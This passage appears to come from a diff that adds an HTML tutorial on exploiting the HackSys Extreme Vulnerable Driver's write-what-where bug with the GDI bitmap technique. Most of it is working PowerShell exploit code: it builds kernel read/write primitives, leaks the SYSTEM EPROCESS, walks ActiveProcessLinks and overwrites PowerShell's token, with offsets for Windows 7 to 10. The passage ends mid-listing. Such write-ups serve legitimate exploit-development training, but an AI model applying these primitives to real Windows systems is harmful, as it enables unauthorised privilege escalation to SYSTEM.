+    $ManagerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30
+    echo "[+] Manager pvScan0 pointer: 0x$("{0:X8}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30))"
+} else {
+	$HandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
+	echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt64]$HandleTableEntry)"
+    $ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)
+	echo "[+] Bitmap Kernel address: 0x$("{0:X16}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)))"
+    $ManagerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50
+    echo "[+] Manager pvScan0 pointer: 0x$("{0:X16}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50))"
+}
+
+# Worker Bitmap
+[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
+$WorkerBitmap = [EVD]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
+echo "[+] Worker BitMap handle: 0x$("{0:X}" -f [int]$WorkerBitmap)"
+if ($x32Architecture) {
+	$HandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
+	echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt32]$HandleTableEntry)"
+    $WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)
+	echo "[+] Bitmap Kernel address: 0x$("{0:X8}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)))"
+    $WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30
+    echo "[+] Worker pvScan0 pointer: 0x$("{0:X8}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30))"
+} else {
+	$HandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
+	echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt64]$HandleTableEntry)"
+    $WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)
+	echo "[+] Bitmap Kernel address: 0x$("{0:X16}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)))"
+    $WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50
+    echo "[+] Worker pvScan0 pointer: 0x$("{0:X16}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50))"
+}
+
+#==============================================[/Bitmap]
+
+#==============================================[GDI ring0 primitive]
+
+$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
+  
+if ($hDevice -eq -1) {
+    echo "`n[!] Unable to get driver handle..`n"
+    Return
+} else {
+    echo "`n[>] Driver information.."
+    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
+    echo "[+] Handle: $hDevice"
+}
+
+# [IntPtr]$WriteWhatPtr->$WriteWhat + $WriteWhere
+#---
+[IntPtr]$WriteWhatPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.BitConverter]::GetBytes($WorkerpvScan0).Length)
+[System.Runtime.InteropServices.Marshal]::Copy([System.BitConverter]::GetBytes($WorkerpvScan0), 0, $WriteWhatPtr, [System.BitConverter]::GetBytes($WorkerpvScan0).Length)
+if ($x32Architecture) {
+	[byte[]]$Buffer = [System.BitConverter]::GetBytes($WriteWhatPtr.ToInt32()) + [System.BitConverter]::GetBytes($ManagerpvScan0)
+} else {
+	[byte[]]$Buffer = [System.BitConverter]::GetBytes($WriteWhatPtr.ToInt64()) + [System.BitConverter]::GetBytes($ManagerpvScan0)
+}
+echo "`n[>] Sending buffer.."
+echo "[+] Buffer length: $($Buffer.Length)"
+echo "[+] IOCTL: 0x22200B"
+[EVD]::DeviceIoControl($hDevice, 0x22200B, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
+
+#==============================================[/GDI ring0 primitive]</pre>
+</div>
+
+<p>Lets run our new POC and inspect the pvScan0 entries in KD.</p>
+
+<p>&nbsp;</p>
+<img src="images/Kernel_GDI_8.png">
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+<img src="images/Kernel_GDI_9.png">
+<p>&nbsp;</p>
+
+<p>As we can see from the image above, we updated the manager pointer correctly essentially getting resuable read/write in the kernel. The process to read and write data using these bitmaps can be seen below.</p>
+
+<p>&nbsp;</p>
+    <div class="terminal_wrap" style="background:#CCC">
+<pre>
+# Arbitrary kernel read
+(1) GDI32::SetBitmapBits(Address)    -> Manager  # This updates the workers pvScan0 pointer
+(2) GDI32::GetBitmapBits(Byte Count) -> Worker   # Reads X bytes from Address
+
+# Arbitrary kernel write
+(1) GDI32::SetBitmapBits(Address)    -> Manager  # This updates the workers pvScan0 pointer
+(2) GDI32::SetBitmapBits(Value)      -> Worker   # Writes X bytes to Address</pre>
+<br />
+</div>
+
+<p>&nbsp;</p>
+<p>Take some time to digest this, admittedly it is a bit confusing at first. For convenience, I created the following helper functions to transparently do IntPtr sized read/write.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+# Arbitrary Kernel read
+function Bitmap-Read {
+    param ($Address)
+    $CallResult = [EVD]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
+    [IntPtr]$Pointer = [EVD]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
+    $CallResult = [EVD]::GetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, $Pointer)
+	if ($x32Architecture){
+    	[System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
+	} else {
+		[System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
+	}
+    $CallResult = [EVD]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
+}
+
+# Arbitrary Kernel write
+function Bitmap-Write {
+    param ($Address, $Value)
+    $CallResult = [EVD]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
+    $CallResult = [EVD]::SetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
+}</pre>
+</div>
+
+<p>&nbsp;</p>
+<p><span style="color: #ffffff;"><strong>Duplicating the SYSTEM token</strong></span><br /><br />
+With an arbitrary read/write in kernel space we still need to figure out how to get SYSTEM. Keep in mind that we are on 64bit Windows 10 with a lot of enhanced mitigation such as SMEP (preventing us from running shellcode from userland). Since we can already copy data freely, it seem appropriate to try a data attack on the executive process block (EPROCESS). The EPROCESS structure contains a process token, this token describes the security context of the process and includes the identity and privileges of the account associated with the process. The OS queries this token when a process or thread tries to interact with a securable object or attempts to perform an action which requires specific privileges.<br /><br />
+
+For our purposes though the process token is just an IntPtr sized value in the EPROCESS struct. Simply put, if we can find a SYSTEM process, copy it's token and overwrite PowerShell's token we will effectively elevate our privileges to SYSTEM.<br /><br />
+
+The first step is to get a pointer to a SYSTEM EPROCESS structure. In fact, to avoid a BSOD, we can only safely target PID 4. There is a very handy global variable called <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff559943(v=vs.85).aspx">PsInitialSystemProcess</a> which is a pointer to the system EPROCESS (-> PID 4). We can get the base address of the NT Kernel by abusing the NtQuerySystemInformation API. I wrote a script, <a href="https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Get-LoadedModules.ps1">Get-LoadedModules</a>, to take care of this for us. To get the address of the PsInitialSystemProcess global variable we can do the following calculations.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+echo "[>] Leaking SYSTEM _EPROCESS.."
+$SystemModuleArray = Get-LoadedModules
+$KernelBase = $SystemModuleArray[0].ImageBase
+$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
+$KernelHanle = [EVD]::LoadLibrary("$KernelType")
+$PsInitialSystemProcess = [EVD]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
+$SystemEprocess = if (!$x32Architecture) {$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase} else {$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase}
+$CallResult = [EVD]::FreeLibrary($KernelHanle)
+echo "[+] _EPORCESS list entry: 0x$("{0:X}" -f $SystemEprocess)"</pre>
+</div>
+
+<p>&nbsp;</p>
+<img src="images/Kernel_GDI_10.png">
+<p>&nbsp;</p>
+
+<p>This address should hold a pointer to the system EPROCESS structure, let's manually verify that.</p>
+
+<p>&nbsp;</p>
+<img src="images/Kernel_GDI_11.png">
+<p>&nbsp;</p>
+
+<p>If we add this logic to our exploit we can use our Bitmap-Read function to copy out the system token. There is just one more thing to take care of, the EPROCESS structure is undocumented and changes fairly frequently so we will want to create a switch statement containing the various offsets we need for all operating systems (32/64 bit). I highly recommend that you take a look at <a href="https://twitter.com/rwfpl">@rwfpl</a>'s most excellent <a href="http://terminus.rewolf.pl/terminus/">Terminus</a> project, it has saved my bacon on more than one occasion. The switch statement can be seen below, notice that it includes an offset for ActiveProcessLinks, we will come to that in a moment.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+# _EPROCESS UniqueProcessId/Token/ActiveProcessLinks offsets based on OS
+# WARNING offsets are invalid for Pre-RTM images!
+$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
+$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
+switch ($OSMajorMinor)
+{
+	'10.0' # Win10 / 2k16
+	{
+		if(!$x32Architecture){
+            $UniqueProcessIdOffset = 0x2e8
+            $TokenOffset = 0x358          
+			$ActiveProcessLinks = 0x2f0
+        } else {
+            $UniqueProcessIdOffset = 0xb4
+            $TokenOffset = 0xf4          
+			$ActiveProcessLinks = 0xb8
+        }
+	}
+
+	'6.3' # Win8.1 / 2k12R2
+	{
+		if(!$x32Architecture){
+            $UniqueProcessIdOffset = 0x2e0
+            $TokenOffset = 0x348          
+			$ActiveProcessLinks = 0x2e8
+        } else {
+            $UniqueProcessIdOffset = 0xb4
+            $TokenOffset = 0xec          
+			$ActiveProcessLinks = 0xb8
+        }
+	}
+
+	'6.2' # Win8 / 2k12
+	{
+		if(!$x32Architecture){
+            $UniqueProcessIdOffset = 0x2e0
+            $TokenOffset = 0x348          
+			$ActiveProcessLinks = 0x2e8
+        } else {
+            $UniqueProcessIdOffset = 0xb4
+            $TokenOffset = 0xec          
+			$ActiveProcessLinks = 0xb8
+        }
+	}
+
+	'6.1' # Win7 / 2k8R2
+	{
+		if(!$x32Architecture){
+            $UniqueProcessIdOffset = 0x180
+            $TokenOffset = 0x208          
+			$ActiveProcessLinks = 0x188
+        } else {
+            $UniqueProcessIdOffset = 0xb4
+            $TokenOffset = 0xf8          
+			$ActiveProcessLinks = 0xb8
+        }
+	}
+}</pre>
+</div>
+
+<p>With the correct offsets we can add the following to our exploit.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+# Get EPROCESS entry for System process
+echo "`n[>] Leaking SYSTEM _EPROCESS.."
+$KernelBase = $SystemModuleArray[0].ImageBase
+$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
+$KernelHanle = [EVD]::LoadLibrary("$KernelType")
+$PsInitialSystemProcess = [EVD]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
+$SysEprocessPtr = if (!$x32Architecture) {$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase} else {$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase}
+$CallResult = [EVD]::FreeLibrary($KernelHanle)
+echo "[+] _EPORCESS list entry: 0x$("{0:X}" -f $SysEprocessPtr)"
+$SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
+echo "[+] SYSTEM _EPORCESS address: 0x$("{0:X}" -f $(Bitmap-Read -Address $SysEprocessPtr))"
+echo "[+] PID: $(Bitmap-Read -Address $($SysEPROCESS+$UniqueProcessIdOffset))"
+echo "[+] SYSTEM Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))"
+$SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)</pre>
+</div>
+
+<p>&nbsp;</p>
+<img src="images/Kernel_GDI_12.png">
+<p>&nbsp;</p>
+
+<p>Notice that the token decremented by 1, this is because the token element is an _EX_FAST_REF and the last bit is used as a reference count. No need for us to worry about this behaviour though. All that remains for a full privesc is to find PowerShell's EPROCESS structure and overwrite it's token with the one we just leaked. This is where the ActiveProcessLinks element comes into play. The EPROCESS struct is part of a linked list where the ActiveProcessLinks element contains a _LIST_ENTRY ([IntPtr]Flink, [IntPtr]Blink]) showing the next and previous EPROCESS struct addresses. All we need to do is traverse this list till we find the EPROCESS structure that corresponds to our PowerShell process and then overwrite the token. The code to do this can be seen below.</p>
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+# Get EPROCESS entry for current process
+echo "`n[>] Leaking current _EPROCESS.."
+echo "[+] Traversing ActiveProcessLinks list"
+$NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
+while($true) {
+	$NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
+	if ($NextPID -eq $PID) {
+		echo "[+] PowerShell _EPORCESS address: 0x$("{0:X}" -f $NextProcess)"
+		echo "[+] PID: $NextPID"
+		echo "[+] PowerShell Token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
+		$PoShTokenAddr = $NextProcess+$TokenOffset
+		break
+	}
+	$NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
+}
+
+# Duplicate token!
+echo "`n[!] Duplicating SYSTEM token!`n"
+Bitmap-Write -Address $PoShTokenAddr -Value $SysToken</pre>
+</div>
+
+<p>&nbsp;</p>
+<h2 class="title">Game Over<span class="line"></span></h2>
+<p>That's all there is to it, the exploit below should work on Windows 7-10 and supports 32 and 64 bit architectures. Drop a comment if there are any outstanding questions!</p><br />
+
+    <div class="main_wrap_support">
+<pre class="brush: powershell;gutter:false;auto-links: false;;">
+Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+
+[StructLayout(LayoutKind.Sequential, Pack = 1)]
+public struct SYSTEM_MODULE_INFORMATION
+{
+	[MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
+	public UIntPtr[] Reserved;
+	public IntPtr ImageBase;
+	public UInt32 ImageSize;
+	public UInt32 Flags;
+	public UInt16 LoadOrderIndex;
+	public UInt16 InitOrderIndex;
+	public UInt16 LoadCount;
+	public UInt16 ModuleNameOffset;
+	[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
+	internal Char[] _ImageName;
+	public String ImageName {
+		get {
+			return new String(_ImageName).Split(new Char[] {'\0'}, 2)[0];
+		}
+	}
+}
+
+[StructLayout(LayoutKind.Sequential)]
+public struct _PROCESS_BASIC_INFORMATION
+{
+	public IntPtr ExitStatus;
+	public IntPtr PebBaseAddress;
+	public IntPtr AffinityMask;
+	public IntPtr BasePriority;
+	public UIntPtr UniqueProcessId;
+	public IntPtr InheritedFromUniqueProcessId;
+}
+
+/// Partial _PEB
+[StructLayout(LayoutKind.Explicit, Size = 256)]
+public struct _PEB
+{
+	[FieldOffset(148)]
+	public IntPtr GdiSharedHandleTable32;
+	[FieldOffset(248)]
+	public IntPtr GdiSharedHandleTable64;
+}
+
+[StructLayout(LayoutKind.Sequential)]
+public struct _GDI_CELL
+{
+	public IntPtr pKernelAddress;
+	public UInt16 wProcessId;
+	public UInt16 wCount;
+	public UInt16 wUpper;
+	public UInt16 wType;
+	public IntPtr pUserAddress;
+}
+
+public static class EVD
+{
+
+	[DllImport("ntdll.dll")]
+	public static extern int NtQueryInformationProcess(
+		IntPtr processHandle, 
+		int processInformationClass,
+		ref _PROCESS_BASIC_INFORMATION processInformation,
+		int processInformationLength,
+		ref int returnLength);
+
+	[DllImport("ntdll.dll")]
+	public static extern int NtQuerySystemInformation(
+		int SystemInformationClass,
+		IntPtr SystemInformation,
+		int SystemInformationLength,
+		ref int ReturnLength);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern IntPtr CreateFile(
+        String lpFileName,
+        UInt32 dwDesiredAccess,
+        UInt32 dwShareMode,
+        IntPtr lpSecurityAttributes,
+        UInt32 dwCreationDisposition,
+        UInt32 dwFlagsAndAttributes,
+        IntPtr hTemplateFile);
+  
+    [DllImport("Kernel32.dll", SetLastError = true)]
+    public static extern bool DeviceIoControl(
+        IntPtr hDevice,
+        int IoControlCode,
+        byte[] InBuffer,
+        int nInBufferSize,
+        byte[] OutBuffer,
+        int nOutBufferSize,
+        ref int pBytesReturned,
+        IntPtr Overlapped);
+
+	[DllImport("kernel32.dll", SetLastError = true)]
+	public static extern IntPtr VirtualAlloc(
+		IntPtr lpAddress,
+		uint dwSize,
+		UInt32 flAllocationType,
+		UInt32 flProtect);
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool VirtualFree(
+        IntPtr lpAddress,
+        uint dwSize,
+        uint dwFreeType);
+
+    [DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
+    public static extern IntPtr LoadLibrary(
+        string lpFileName);
+      
+    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
+    public static extern IntPtr GetProcAddress(
+        IntPtr hModule,
+        string procName);
+
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool FreeLibrary(
+        IntPtr hModule);
+
+	[DllImport("gdi32.dll")]
+	public static extern IntPtr CreateBitmap(
+		int nWidth,
+		int nHeight,
+		uint cPlanes,
+		uint cBitsPerPel,
+		IntPtr lpvBits);
+
+    [DllImport("gdi32.dll")]
+    public static extern int SetBitmapBits(
+        IntPtr hbmp,
+        uint cBytes,
+        byte[] lpBits);
+
+    [DllImport("gdi32.dll")]
+    public static extern int GetBitmapBits(
+        IntPtr hbmp,
+        int cbBuffer,
+        IntPtr lpvBits);
+}
+"@
+
+#==============================================[PEB]
+
+# Flag architecture $x32Architecture/!$x32Architecture
+if ([System.IntPtr]::Size -eq 4) {
+	echo "`n[>] Target is 32-bit!"
+	$x32Architecture = 1
+} else {
+	echo "`n[>] Target is 64-bit!"
+}
+# Current Proc handle
+$ProcHandle = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle
+# Process Basic Information
+$PROCESS_BASIC_INFORMATION = New-Object _PROCESS_BASIC_INFORMATION
+$PROCESS_BASIC_INFORMATION_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($PROCESS_BASIC_INFORMATION)
+$returnLength = New-Object Int
+$CallResult = [EVD]::NtQueryInformationProcess($ProcHandle, 0, [ref]$PROCESS_BASIC_INFORMATION, $PROCESS_BASIC_INFORMATION_Size, [ref]$returnLength)
+# PID & PEB address
+echo "`n[?] PID $($PROCESS_BASIC_INFORMATION.UniqueProcessId)"
+if ($x32Architecture) {
+	echo "[+] PebBaseAddress: 0x$("{0:X8}" -f $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt32())"
+} else {
+	echo "[+] PebBaseAddress: 0x$("{0:X16}" -f $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64())"
+}
+# Lazy PEB parsing
+$_PEB = New-Object _PEB
+$_PEB = $_PEB.GetType()
+$BufferOffset = $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64()
+$NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset
+$PEBFlags = [system.runtime.interopservices.marshal]::PtrToStructure($NewIntPtr, [type]$_PEB)
+# GdiSharedHandleTable
+if ($x32Architecture) {
+	echo "[+] GdiSharedHandleTable: 0x$("{0:X8}" -f $PEBFlags.GdiSharedHandleTable32.ToInt32())"
+} else {
+	echo "[+] GdiSharedHandleTable: 0x$("{0:X16}" -f $PEBFlags.GdiSharedHandleTable64.ToInt64())"
+}
+# _GDI_CELL size
+$_GDI_CELL = New-Object _GDI_CELL
+$_GDI_CELL_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($_GDI_CELL)
+
+#==============================================[/PEB]
+
+#==============================================[Bitmap]
+
+echo "`n[>] Creating Bitmaps.."
+
+# Manager Bitmap
+[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
+$ManagerBitmap = [EVD]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
+echo "[+] Manager BitMap handle: 0x$("{0:X}" -f [int]$ManagerBitmap)"
+if ($x32Architecture) {
+	$HandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
+	echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt32]$HandleTableEntry)"
+    $ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)
+	echo "[+] Bitmap Kernel address: 0x$("{0:X8}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)))"
+    $ManagerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30
+    echo "[+] Manager pvScan0 pointer: 0x$("{0:X8}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30))"
+} else {
+	$HandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
+	echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt64]$HandleTableEntry)"
+    $ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)
+	echo "[+] Bitmap Kernel address: 0x$("{0:X16}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)))"
+    $ManagerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50
+    echo "[+] Manager pvScan0 pointer: 0x$("{0:X16}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50))"
+}
+
+# Worker Bitmap
+[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
+$WorkerBitmap = [EVD]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
+echo "[+] Worker BitMap handle: 0x$("{0:X}" -f [int]$WorkerBitmap)"
+if ($x32Architecture) {
+	$HandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
+	echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt32]$HandleTableEntry)"
+    $WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)
+	echo "[+] Bitmap Kernel address: 0x$("{0:X8}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)))"
+    $WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30
+    echo "[+] Worker pvScan0 pointer: 0x$("{0:X8}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt32($HandleTableEntry)) + 0x30))"
+} else {
+	$HandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
+	echo "[+] HandleTableEntry: 0x$("{0:X}" -f [UInt64]$HandleTableEntry)"
+    $WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)
+	echo "[+] Bitmap Kernel address: 0x$("{0:X16}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)))"
+    $WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50
+    echo "[+] Worker pvScan0 pointer: 0x$("{0:X16}" -f $($([System.Runtime.InteropServices.Marshal]::ReadInt64($HandleTableEntry)) + 0x50))"
+}
+
+#==============================================[/Bitmap]
+
+#==============================================[GDI ring0 primitive]
+
+$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
+  
+if ($hDevice -eq -1) {
+    echo "`n[!] Unable to get driver handle..`n"
+    Return
+} else {
+    echo "`n[>] Driver information.."
+    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
+    echo "[+] Handle: $hDevice"
+}
+
+# [IntPtr]$WriteWhatPtr->$WriteWhat + $WriteWhere
+#---
+[IntPtr]$WriteWhatPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.BitConverter]::GetBytes($WorkerpvScan0).Length)
+[System.Runtime.InteropServices.Marshal]::Copy([System.BitConverter]::GetBytes($WorkerpvScan0), 0, $WriteWhatPtr, [System.BitConverter]::GetBytes($WorkerpvScan0).Length)
+if ($x32Architecture) {
+	[byte[]]$Buffer = [System.BitConverter]::GetBytes($WriteWhatPtr.ToInt32()) + [System.BitConverter]::GetBytes($ManagerpvScan0)
+} else {
+	[byte[]]$Buffer = [System.BitConverter]::GetBytes($WriteWhatPtr.ToInt64()) + [System.BitConverter]::GetBytes($ManagerpvScan0)
+}
+echo "`n[>] Sending buffer.."
+echo "[+] Buffer length: $($Buffer.Length)"
+echo "[+] IOCTL: 0x22200B"
+[EVD]::DeviceIoControl($hDevice, 0x22200B, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
+
+#==============================================[/GDI ring0 primitive]
+
+#==============================================[Leak loaded module base addresses]
+
+[int]$BuffPtr_Size = 0
+while ($true) {
+	[IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtr_Size)
+	$SystemInformationLength = New-Object Int
+
+	# SystemModuleInformation Class = 11
+	$CallResult = [EVD]::NtQuerySystemInformation(11, $BuffPtr, $BuffPtr_Size, [ref]$SystemInformationLength)
+	
+	# STATUS_INFO_LENGTH_MISMATCH
+	if ($CallResult -eq 0xC0000004) {
+		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
+		[int]$BuffPtr_Size = [System.Math]::Max($BuffPtr_Size,$SystemInformationLength)
+	}
+	# STATUS_SUCCESS
+	elseif ($CallResult -eq 0x00000000) {
+		break
+	}
+	# Probably: 0xC0000005 -> STATUS_ACCESS_VIOLATION
+	else {
+		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
+		echo "[!] Error, NTSTATUS Value: $('{0:X}' -f ($CallResult))`n"
+		return
+	}
+}
+
+$SYSTEM_MODULE_INFORMATION = New-Object SYSTEM_MODULE_INFORMATION
+$SYSTEM_MODULE_INFORMATION = $SYSTEM_MODULE_INFORMATION.GetType()
+if ([System.IntPtr]::Size -eq 4) {
+	$SYSTEM_MODULE_INFORMATION_Size = 284
+} else {
+	$SYSTEM_MODULE_INFORMATION_Size = 296
+}
+
+$BuffOffset = $BuffPtr.ToInt64()
+$HandleCount = [System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset)
+$BuffOffset = $BuffOffset + [System.IntPtr]::Size
+
+$SystemModuleArray = @()
+for ($i=0; $i -lt $HandleCount; $i++){
+	$SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset
+	$Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SYSTEM_MODULE_INFORMATION)
+	
+	$HashTable = @{
+		ImageName = $Cast.ImageName
+		ImageBase = if ([System.IntPtr]::Size -eq 4) {$($Cast.ImageBase).ToInt32()} else {$($Cast.ImageBase).ToInt64()}
+		ImageSize = "0x$('{0:X}' -f $Cast.ImageSize)"
+	}
+	
+	$Object = New-Object PSObject -Property $HashTable
+	$SystemModuleArray += $Object
+
+	$BuffOffset = $BuffOffset + $SYSTEM_MODULE_INFORMATION_Size
+}
+
+# Free SystemModuleInformation array
+[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
+
+#==============================================[/Leak loaded module base addresses]
+
+#==============================================[Duplicate SYSTEM token]
+
+# _EPROCESS UniqueProcessId/Token/ActiveProcessLinks offsets based on OS
+# WARNING offsets are invalid for Pre-RTM images!
+$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
+$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
+switch ($OSMajorMinor)
+{
+    '10.0' # Win10 / 2k16
+    {
+        if(!$x32Architecture){
+            $UniqueProcessIdOffset = 0x2e8
+            $TokenOffset = 0x358          
+            $ActiveProcessLinks = 0x2f0
+        } else {
+            $UniqueProcessIdOffset = 0xb4
+            $TokenOffset = 0xf4          
+            $ActiveProcessLinks = 0xb8
+        }
+    }
+ 
